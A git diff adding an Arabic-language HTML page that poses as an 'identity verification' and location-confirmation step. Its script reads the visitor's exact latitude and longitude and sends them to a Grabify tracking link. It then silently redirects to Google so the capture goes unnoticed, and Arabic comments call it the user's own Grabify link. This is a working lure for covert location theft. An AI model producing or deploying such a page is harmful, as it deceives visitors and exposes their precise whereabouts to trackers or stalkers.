@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تحقق من الهوية</title>
+</head>
+<body style="text-align:center; font-family:sans-serif; margin-top:50px; background-color:#f4f4f4;">
+
+  <div style="background:white; padding:20px; display:inline-block; border-radius:10px; shadow: 0 4px 8px rgba(0,0,0,0.1);">
+    <h2>📍 تأكيد الموقع الجغرافي</h2>
+    <p>للمتابعة إلى المحتوى، يرجى السماح بالوصول للموقع</p>
+    <button onclick="sendLocation()" style="padding:12px 24px; font-size:18px; background-color:#28a745; color:white; border:none; border-radius:5px; cursor:pointer;">
+      موافق ومتابعة
+    </button>
+  </div>
+
+  <script>
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // إرسال الإحداثيات إلى رابط Grabify الخاص بك
+          // نستخدم الإحداثيات كـ "Parameters" لتظهر في الإحصائيات
+          const trackingURL = `https://grabify.link/HTN70M?data=Lat:${lat}_Lon:${lon}`;
+
+          fetch(trackingURL, { mode: 'no-cors' }).finally(() => {
+            // توجيه المستخدم لصفحة حقيقية بعد السحب (جوجل كمثال)
+            window.location.href = "https://www.google.com";
+          });
+
+        }, function(error) {
+          alert("خطأ: يجب السماح بالوصول للموقع لتشغيل الخدمة.");
+        });
+      } else {
+        alert("متصفحك لا يدعم هذه الخاصية.");
+      }
+    }
+  </script>
+</body>
+</html>
